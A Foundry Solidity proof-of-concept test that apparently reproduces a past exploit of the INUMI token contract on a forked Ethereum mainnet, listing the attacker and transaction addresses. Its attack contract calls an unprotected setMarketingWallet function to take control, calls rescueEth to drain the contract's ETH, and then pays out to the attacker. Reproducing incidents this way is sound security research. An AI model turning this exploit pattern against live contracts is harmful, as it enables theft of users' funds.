pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.7K USD
// Attacker : https://etherscan.io/address/0x43debe92a7a32dca999593fad617dbd2e6b080a5s
// Attack Contract : https://etherscan.io/address/0x5b5a0580bcfd3673820bb249514234afad33e209
// Vulnerable Contract : https://etherscan.io/address/0xdb27d4ff4be1cd04c34a7cb6f47402c37cb73459
// Attack Tx : https://etherscan.io/tx/0x45ce017f5a295f387eafb596b4bcb1192dd1c302ccb9d097d7fa2cdf3008b139

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xdb27d4ff4be1cd04c34a7cb6f47402c37cb73459

// @Analysis

// Post-mortem : https://x.com/TenArmorAlert/status/1834503422655263099
// Twitter Guy : https://x.com/TenArmorAlert/status/1834503422655263099
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant addr1 = 0x5B5A0580bcfd3673820Bb249514234aFAD33e209;
address constant attacker = 0x43dEbe92A7A32DCa999593fAd617dBD2e6b080a5;
address constant INUMI_contract = 0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20729672-1);
        deal(attacker, 1.07297e-13 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 2.0000000000001075 ether);
        attC.attack{value: 1.07297e-13 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x5B5A0580bcfd3673820Bb249514234aFAD33e209
contract AttackerC {
    function attack() public payable {
        // call_1: INUMI_contract.setMarketingWallet(addr1)
        (bool s1, ) = INUMI_contract.call(abi.encodeWithSelector(bytes4(keccak256("setMarketingWallet(address)")), address(this)));
        require(s1, "setMarketingWallet fail");

        // call_2: INUMI_contract.rescueEth()
        (bool s2, ) = INUMI_contract.call(abi.encodeWithSelector(bytes4(keccak256("rescueEth()"))));
        require(s2, "rescueEth fail");

        // static call_3: WETH.balanceOf(address(this))
        uint256 bal = IWETH9(weth9).balanceOf(address(this));

        if (bal == 0) {
            // Replicate the gasprice-based payout logic
            unchecked {
                uint256 gp = tx.gasprice;
                if (((43900 * gp) / (gp == 0 ? 1 : gp) == 43900) || gp == 0) {
                    if (2 ether > (43900 * gp)) {
                        int256 denom = int256(2 ether) - int256(43900 * gp);
                        if ((denom != 0 && (int256(400 ether) - int256(8780000 * gp)) / denom == 200) || denom == 0) {
                            int256 numer = int256(400 ether) - int256(8780000 * gp);
                            if (numer / 1000 != 0) {
                                // // coinbase payment
                                // uint256 toCb = uint256(numer / 1000);
                                // payable(block.coinbase).call{value: toCb}("");

                                // send fixed amount to attacker
                                (bool s3, ) = payable(attacker).call{value: 1600155836139037101}("");
                            }
                        }
                    }
                }
            }
        }
    }

    fallback() external payable {}

    receive() external payable {}
}

interface IWETH9 {
	function balanceOf(address) external returns (uint256); 
}